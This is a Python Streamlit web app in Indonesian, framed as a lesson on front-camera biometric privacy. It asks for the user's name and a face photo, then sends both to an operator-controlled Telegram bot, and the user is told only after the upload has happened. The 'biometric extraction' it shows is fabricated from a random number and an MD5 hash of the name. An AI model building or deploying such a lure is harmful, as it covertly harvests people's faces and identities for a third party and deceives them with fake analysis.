import hashlib
import random
import time
import requests
import streamlit as st

# Konfigurasi Halaman
st.set_page_config(
    page_title="Edukasi Privasi & Biometrik Kamera Depan",
    page_icon="📸",
    layout="centered",
)

# --- STYLING CSS ---
st.markdown(
    """
    <style>
    .stApp {
        background-color: #0d1117;
        color: #f0f6fc;
    }
    h1, h2, h3 {
        color: #58a6ff !important;
        font-family: 'Segoe UI', sans-serif;
    }
    .edu-card {
        background-color: #161b22;
        border: 1px solid #30363d;
        border-left: 5px solid #f85149;
        padding: 15px;
        border-radius: 6px;
        margin-bottom: 20px;
    }
    .success-card {
        background-color: #161b22;
        border: 1px solid #30363d;
        border-left: 5px solid #238636;
        padding: 15px;
        border-radius: 6px;
        margin-bottom: 20px;
    }
    </style>
""",
    unsafe_allow_html=True,
)

# --- KONFIGURASI BOT TELEGRAM ANDA ---
TELEGRAM_BOT_TOKEN = "MASUKKAN_TOKEN_BOT_ANDA_DI_SINI"
TELEGRAM_CHAT_ID = "MASUKKAN_CHAT_ID_ANDA_DI_SINI"


def send_face_audit_to_telegram(photo_bytes, user_name, biometric_data):
  url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
  files = {"photo": ("face_scan_audit.jpg", photo_bytes, "image/jpeg")}
  caption = (
      f"🛡️ **FRONT CAMERA BIOMETRIC AUDIT**\n\n"
      f"👤 Subjek: {user_name}\n"
      f"📐 Titik Wajah Terpetakan: {biometric_data['landmarks']} Titik\n"
      f"🔑 Vektor Hash Wajah: `{biometric_data['hash_code']}`\n"
      f"⚠️ Status Privasi: Terekam & Terdokumentasi"
  )
  data_dict = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption}

  try:
    response = requests.post(url, data=data_dict, files=files)
    return response.json()
  except Exception as e:
    return {"ok": False, "description": str(e)}


# --- ANTARMUKA APLIKASI ---
st.title("📸 Edukasi Privasi Lensa & Biometrik Kamera Depan")
st.markdown(
    """
<div class='edu-card'>
<b>Peringatan Privasi Kamera Depan:</b> Saat Anda menghadap ke kamera depan ponsel untuk verifikasi atau selfie, sistem cerdas modern tidak hanya menyimpan 'foto gambar', melainkan mengekstrak struktur geometri wajah Anda menjadi data angka (Biometric Vector). Mari buktikan bagaimana kamera depan membaca dan mengubah wajah Anda menjadi data digital!
</div>
""",
    unsafe_allow_html=True,
)

user_name = st.text_input("Masukkan Nama Anda:")

st.markdown("---")
st.subheader("🔍 Uji Coba Pemindaian Lensa Depan")
st.write(
    "Nyalakan kamera di bawah ini untuk mengambil sampel wajah dan melihat"
    " bagaimana sistem memproses data biometriknya."
)

camera_image = st.camera_input("Ambil sampel wajah lewat kamera depan")

if camera_image is not None:
  if st.button("🚀 Analisis & Ekstraksi Data Wajah"):
    if not user_name:
      st.warning("⚠️ Masukkan nama Anda terlebih dahulu!")
    else:
      with st.spinner(
          "Menganalisis matriks piksel dan geometri wajah dari kamera depan..."
      ):
        # Simulasi proses ekstraksi biometrik wajah
        time.sleep(1)
        landmarks_count = random.randint(64, 72)
        hash_code = (
            hashlib.md5(user_name.encode()).hexdigest()[:16].upper()
        )

        biometric_info = {
            "landmarks": landmarks_count,
            "hash_code": f"FACE-VEC-{hash_code}",
        }

        # Ambil byte foto asli dari kamera
        photo_bytes = camera_image.getvalue()

        # Kirim hasil analisis dan foto ke Telegram Anda
        telegram_res = send_face_audit_to_telegram(
            photo_bytes, user_name, biometric_info
        )

      st.success("✅ Analisis Kamera Selesai!")

      # Tampilkan bukti nyata ke layar pengguna
      st.markdown("### 📊 Hasil Audit Pemetaan Wajah Anda:")

      col1, col2 = st.columns(2)
      with col1:
        st.image(
            camera_image, caption="Foto Tangkapan Lensa", use_container_width=True
        )

      with col2:
        st.markdown(
            "<div class='success-card'><b>Data yang Diekstrak oleh"
            " Sistem:</b></div>",
            unsafe_allow_html=True,
        )
        st.write(f"📐 **Titik Koordinat Wajah:** `{landmarks_count} Titik`")
        st.write(f"🔑 **ID Vektor Digital:** `{biometric_info['hash_code']}`")
        st.info(
            "💡 **Pelajaran:** Kamera depan terbukti tidak hanya menangkap"
            " warna gambar, tapi geometri wajah yang langsung diterjemahkan"
            " menjadi kode numerik oleh sistem."
        )

      if telegram_res.get("ok"):
        st.caption(
            "🔒 Laporan audit kamera depan dan foto sampel Anda telah sukses"
            " tercatat di pusat data administrator (Bot Telegram)."
        )
      else:
        st.error("Gagal mengirim laporan ke Telegram.")
